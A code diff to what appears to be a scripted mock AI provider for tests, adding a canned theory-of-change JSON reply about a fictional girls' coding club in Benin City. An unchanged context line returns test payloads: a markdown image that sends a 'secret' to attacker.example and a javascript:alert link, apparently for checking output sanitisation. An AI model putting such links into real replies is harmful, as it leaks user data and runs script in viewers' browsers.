@@ -20,6 +20,29 @@ export function reply(prompt: PromptMessage[]): string {
   const last = textOf([...prompt].reverse().find((m) => m.role === "user")?.content);
   const lens = last.match(/perspective of: ([^.]+)\./)?.[1];
   if (/FAIL_PLEASE/.test(last)) throw new Error("Scripted provider failure");
+  if (/THEORY OF CHANGE EXTRACTION/.test(last)) {
+    const asked = prompt.filter((m) => m.role === "user").map((m) => textOf(m.content)).join(" ");
+    if (/GARBLED_PLEASE/.test(asked)) return "Sorry, here is a summary instead.";
+    return "```json\n" + JSON.stringify({
+      organization: "Bright Futures Coding Clubs",
+      problem: "Girls in Benin City have little access to digital skills training.",
+      population: "Girls aged 12 to 17 in public secondary schools, Benin City",
+      inputs: ["Two foundation grants", "Volunteer coaches", "Donated laptops"],
+      activities: ["Weekly after-school coding clubs", "Mentoring by women in tech", "Annual demo day"],
+      outputs: ["120 girls complete a 12-week course", "40 projects shown at demo day"],
+      shortTermOutcomes: ["Girls gain basic coding skills", "Confidence with computers rises"],
+      longTermOutcomes: ["Inferred: More girls choose STEM subjects", "Graduates find tech internships"],
+      impact: "Young women in Edo State build careers in the digital economy.",
+      assumptions: [
+        { text: "Schools give clubs a room and time each week", link: "inputs-activities", evidence: "strong" },
+        { text: "Girls keep attending despite household chores", link: "activities-outputs", evidence: "some" },
+        { text: "Skills from 12 weeks are enough to change choices", link: "outputs-outcomes", evidence: "none" },
+        { text: "Local tech firms hire young women", link: "outcomes-impact", evidence: "none" },
+      ],
+      gaps: ["No follow-up after girls leave the club", "No baseline of skills"],
+      risks: ["Grant renewal in 2027 is uncertain", "Power cuts disrupt sessions"],
+    }) + "\n```";
+  }
   if (/INJECT_PLEASE/.test(last)) {
     return "Summary ![chart](https://attacker.example/leak?q=secret) and [source](javascript:alert(1)) and [ok](https://example.org)";
   }
